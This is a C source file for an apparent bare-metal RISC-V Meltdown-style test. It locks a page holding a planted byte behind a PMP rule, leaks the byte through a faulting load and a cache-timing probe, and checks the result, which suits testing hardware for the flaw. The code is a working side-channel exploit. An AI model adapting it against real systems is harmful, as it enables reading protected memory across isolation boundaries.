#include <stdint.h>
#include <stdio.h>

#include "rv64_spectre.h"

#ifndef CACHE_HIT_THRESHOLD
#define CACHE_HIT_THRESHOLD 50
#endif

#ifndef MELTDOWN_ATTEMPTS
#define MELTDOWN_ATTEMPTS 64
#endif

#define PMP_CFG_NAPOT_NO_ACCESS_LOCKED 0x98u
#define SECRET_VALUE 0x53u

static uint8_t probe[PROBE_BYTES] __attribute__((aligned(L1_SET_SPAN_BYTES)));
static uint8_t secret_page[4096] __attribute__((aligned(4096)));

static volatile uintptr_t recover_pc;
static volatile uint64_t trap_count;
static volatile uint64_t last_trap_cause;
static volatile int trap_armed;

static inline uintptr_t pmp_napot_addr(uintptr_t base, uintptr_t size)
{
  return (base >> 2) | ((size / 2u - 1u) >> 2);
}

static void deny_secret_page(void)
{
  const uintptr_t base = (uintptr_t)secret_page;
  const uintptr_t pmpaddr = pmp_napot_addr(base, sizeof(secret_page));

  asm volatile("csrw pmpaddr0, %0" : : "r"(pmpaddr));
  asm volatile("csrw pmpcfg0, %0" : : "r"(PMP_CFG_NAPOT_NO_ACCESS_LOCKED));
  asm volatile("fence rw, rw" ::: "memory");
}

uintptr_t handle_trap(uintptr_t cause, uintptr_t epc, uintptr_t regs[32])
{
  (void)epc;
  (void)regs;

  last_trap_cause = cause;
  trap_count++;

  if (trap_armed && recover_pc != 0)
    return recover_pc;

  while (1)
    ;
}

static __attribute__((noinline)) void meltdown_try(uint8_t *fault_addr, uint8_t *probe_base)
{
  trap_armed = 1;
  recover_pc = (uintptr_t)&&recover;
  asm volatile(
    "fence rw, rw\n"
    "lb t0, 0(%[fault_addr])\n"
    "slli t0, t0, 6\n"
    "add t0, t0, %[probe_base]\n"
    "ld t1, 0(t0)\n"
    :
    : [fault_addr] "r"(fault_addr),
      [probe_base] "r"(probe_base)
    : "t0", "t1", "memory");
recover:
  trap_armed = 0;
  recover_pc = 0;
  asm volatile("fence rw, rw" ::: "memory");
}

static void flush_probe(uint8_t *probe_base)
{
  for (size_t i = 0; i < PROBE_ENTRIES; ++i)
    flush_line(&probe_base[i * PROBE_STRIDE]);
}

static void read_faulting_byte(uint8_t *fault_addr,
                               uint8_t result[2],
                               uint64_t score[2],
                               uint64_t threshold)
{
  uint64_t hits[PROBE_ENTRIES];

  for (size_t i = 0; i < PROBE_ENTRIES; ++i)
    hits[i] = 0;

  for (int attempt = 0; attempt < MELTDOWN_ATTEMPTS; ++attempt)
  {
    flush_probe(probe);
    fence_all();
    meltdown_try(fault_addr, probe);

    for (size_t i = 0; i < PROBE_ENTRIES; ++i)
    {
      const size_t mixed_i = probe_mix(i);
      const uint64_t elapsed = probe_time(&probe[mixed_i * PROBE_STRIDE]);
      if (elapsed <= threshold)
        hits[mixed_i]++;
    }
  }

  top_two_idx(hits, PROBE_ENTRIES, result, score);
}

int main(void)
{
  if (spectre_runtime_init() != 0)
  {
    printf("[meltdown] runtime init failed\n");
    return 1;
  }

  probe_init(probe);
  secret_page[0] = SECRET_VALUE;

  const uint64_t measured_threshold = calibrate_probe_threshold(probe);
  uint64_t threshold = measured_threshold != 0 ? measured_threshold : CACHE_HIT_THRESHOLD;
#if CACHE_HIT_THRESHOLD > 0
  threshold = CACHE_HIT_THRESHOLD;
#endif

  printf("[meltdown] mode=pmp-fault-inline\n");
  printf("[meltdown] calibration fallback=%d measured=%lu threshold=%lu attempts=%d\n",
         CACHE_HIT_THRESHOLD, measured_threshold, threshold, MELTDOWN_ATTEMPTS);
  printf("[meltdown] secret_page=%p secret=0x%02x\n",
         (void *)secret_page, (unsigned int)SECRET_VALUE);

  deny_secret_page();

  uint8_t result[2] = {0, 0};
  uint64_t score[2] = {0, 0};
  read_faulting_byte(secret_page, result, score, threshold);

  printf("[meltdown] traps=%lu last_cause=%lu\n", trap_count, last_trap_cause);
  printf("[meltdown] byte  0: %c (0x%02x) score=%lu\n",
         (result[0] >= 32 && result[0] < 127) ? result[0] : '?',
         result[0],
         score[0]);
  printf("[meltdown] expected: %c (0x%02x) second=%c (0x%02x) score=%lu\n",
         SECRET_VALUE,
         SECRET_VALUE,
         (result[1] >= 32 && result[1] < 127) ? result[1] : '?',
         result[1],
         score[1]);
  printf("[meltdown] check 0 0x%02x 0x%02x traps=%lu\n",
         result[0],
         SECRET_VALUE,
         trap_count);

  return (trap_count > 0 && result[0] == SECRET_VALUE) ? 0 : 1;
}
